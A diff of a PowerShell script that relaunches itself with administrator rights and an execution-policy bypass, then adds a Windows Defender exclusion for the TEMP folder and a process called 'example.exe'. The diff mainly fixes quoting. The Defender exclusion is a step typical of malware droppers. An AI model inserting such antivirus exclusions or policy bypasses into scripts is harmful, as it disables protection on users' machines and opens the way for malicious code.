@@ -1,12 +1,15 @@
+# # FIRST THINGS FIRST
+
 # Check if the script is running with elevated privileges
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     # Relaunch the script with elevated privileges
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"" -Verb RunAs
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
 # Set the execution policy
 Set-ExecutionPolicy RemoteSigned -Force
+
 
 Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
 
@@ -14,6 +17,8 @@ Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
 
 # # If script reaches here, it is running with Administrator privileges
 # Write-Host "This script is running with Administrator privileges."
+
+
 
 
 # ##############################################################################
